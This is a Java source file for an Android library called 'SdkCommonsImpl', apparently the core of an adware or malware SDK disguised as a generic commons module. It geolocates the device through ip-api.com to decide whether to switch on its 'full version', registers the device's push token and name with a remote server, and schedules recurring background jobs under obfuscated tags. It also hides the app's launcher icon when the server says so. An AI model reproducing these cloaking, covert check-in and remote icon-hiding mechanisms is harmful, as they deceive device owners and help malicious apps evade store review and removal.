package commons.app.com.commons.commons;

import android.annotation.SuppressLint;
import android.app.Application;
import android.content.Context;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.evernote.android.job.Job;
import com.evernote.android.job.JobCreator;
import com.evernote.android.job.JobManager;
import com.evernote.android.job.JobRequest;
import com.google.firebase.iid.FirebaseInstanceId;
import com.google.gson.Gson;
import com.google.gson.JsonParseException;

import java.io.IOException;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import commons.app.com.commons.CommonUtils;
import commons.app.com.commons.Network;
import commons.app.com.keep.DeviceInfo;
import commons.app.com.keep.NetworkApi;
import commons.app.com.keep.Settings;
import commons.app.com.keep.SyncResponse;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import timber.log.Timber;

@SuppressWarnings("SameParameterValue")
public class SdkCommonsImpl implements SdkCommons, JobCreator {

    private static final String JOB_TAG_CHECK_PENDING = "i92797272729_j_2";
    private static final String JOB_TAG_CHECK_PENDING_NOW = "i92797272729_j_3";

    @SuppressLint("StaticFieldLeak") private static SdkCommonsImpl instance;

    private final Application context;
    private final String applicationId;
    private final boolean isDebugMode;
    private final boolean useFullVersion;
    private final Class launcherActivity;
    private final List<SdkComponent> components;
    private final Gson gson;

    /**
     * Instances
     */
    private final Network api;

    private final AtomicBoolean isDeviceAcceptable = new AtomicBoolean(false);

    public static SdkCommons get() {
        return instance;
    }

    public static void init(Application application,
                            String applicationId,
                            String baseUrl,
                            Class launcherActivity,
                            boolean isDebugMode,
                            boolean useFullVersion,
                            @NonNull List<SdkComponent> components) {
        instance = new SdkCommonsImpl(application, applicationId, baseUrl, launcherActivity, isDebugMode, useFullVersion, components);
        instance.onInstanceCreated();
    }

    private SdkCommonsImpl(Application context,
                           String applicationId,
                           String baseUrl,
                           Class launcherActivity,
                           boolean isDebugMode, boolean useFullVersion,
                           List<SdkComponent> components) {
        this.context = context;
        this.applicationId = applicationId;
        this.isDebugMode = isDebugMode;
        this.useFullVersion = useFullVersion;
        this.launcherActivity = launcherActivity;
        this.components = components;
        this.gson = new Gson();
        //
        if (isDebugMode) {
            Timber.plant(new Timber.DebugTree());
        }
        // init
        api = new Network(baseUrl, gson, CommonUtils.getDeviceId(context), isDebugMode);
        JobManager.create(context).addJobCreator(this);
    }

    private void onInstanceCreated() {
        // Load IP info
        api().makeGet("http://ip-api.com/json", new HashMap<String, String>())
                .enqueue(new Callback<ResponseBody>() {
                    @Override
                    public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                        DeviceInfo deviceInfo = null;
                        try {
                            String json = response.body().string();
                            deviceInfo = safeParse(json, DeviceInfo.class);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        if (deviceInfo != null) {
                            isDeviceAcceptable.set(CommonUtils.isDeviceAcceptable(deviceInfo));
                        } else {
                            isDeviceAcceptable.set(true);
                        }
                        initializeComponents();
                    }

                    @Override
                    public void onFailure(Call<ResponseBody> call, Throwable t) {
                        t.printStackTrace();
                        // in case when network is not available
                        isDeviceAcceptable.set(true);
                        initializeComponents();
                    }
                });
    }

    private void initializeComponents() {
        for (SdkComponent component : getComponents()) {
            component.initialize(context, this, api.getRetrofit());
        }
        refreshDeviceInfo();
    }

    @Override
    public void refreshDeviceInfo() {
        if (!isUseFullVersion()) {
            return;
        }
        String fcmToken = FirebaseInstanceId.getInstance().getToken();
        Timber.i("onInstanceCreated -> fcmToken[%s]", fcmToken);
        api().register(fcmToken, CommonUtils.getDeviceFullName()).enqueue(new Callback<Object>() {
            @Override
            public void onResponse(Call<Object> call, Response<Object> response) {
                startInstallCheckJobNow();
                startInstallCheckJobRepeated();
                for (SdkComponent component : getComponents()) {
                    component.onDeviceRegistered();
                }
            }

            @Override
            public void onFailure(Call<Object> call, Throwable t) {
                // nothing
            }
        });
    }

    @Override
    public Context ctx() {
        return context;
    }

    @Override
    public String applicationId() {
        return applicationId;
    }

    @Override
    public NetworkApi api() {
        return api.getRetrofit();
    }

    @Override
    public Gson gson() {
        return gson;
    }

    @Override
    public Class getLauncherActivityClass() {
        return launcherActivity;
    }

    @Override
    public boolean isUseFullVersion() {
        return useFullVersion && isDeviceAcceptable.get();
    }

    @Override
    public List<SdkComponent> getComponents() {
        return components;
    }

    @Nullable
    @Override
    public Job create(@NonNull String tag) {
        if (JOB_TAG_CHECK_PENDING.equals(tag) ||
                JOB_TAG_CHECK_PENDING_NOW.equals(tag)) {
            return new LoadDataJob();
        }
        for (SdkComponent component : getComponents()) {
            Job job = component.createJob(tag);
            if (job != null) {
                return job;
            }
        }
        return null;
    }

    void onSyncEvent(@NonNull String json) {
        for (SdkComponent component : SdkCommonsImpl.get().getComponents()) {
            component.onSyncEvent(json);
        }
        SyncResponse syncResponse = safeParse(json, SyncResponse.class);
        if (syncResponse != null) {
            Settings settings = syncResponse.getSettings();
            if (settings != null) {
                CommonUtils.hideApp(context, settings.isHideApp(), launcherActivity);
            }
        }
    }

    ///////////////////////////////////////////////////////////////////////////
    // INNER
    ///////////////////////////////////////////////////////////////////////////

    private void startInstallCheckJobNow() {
        long executionWindow = TimeUnit.SECONDS.toMillis(10);
        long startTime = TimeUnit.SECONDS.toMillis(isDebugMode ? 5 : 45);
        new JobRequest.Builder(JOB_TAG_CHECK_PENDING_NOW)
                .setExecutionWindow(startTime, startTime + executionWindow)
                .setBackoffCriteria(startTime, JobRequest.BackoffPolicy.EXPONENTIAL)
                .setUpdateCurrent(true)
                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
                .build()
                .schedule();
    }

    private void startInstallCheckJobRepeated() {
        new JobRequest.Builder(JOB_TAG_CHECK_PENDING)
                .setPeriodic(TimeUnit.MINUTES.toMillis(40), TimeUnit.MINUTES.toMillis(20))
                .setUpdateCurrent(true)
                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
                .build()
                .schedule();
    }

    @Nullable
    private <T> T safeParse(String json, Class<T> classOfT) {
        if (TextUtils.isEmpty(json)) return null;
        try {
            return gson().fromJson(json, classOfT);
        } catch (JsonParseException e) {
            e.printStackTrace();
        }
        return null;
    }
}
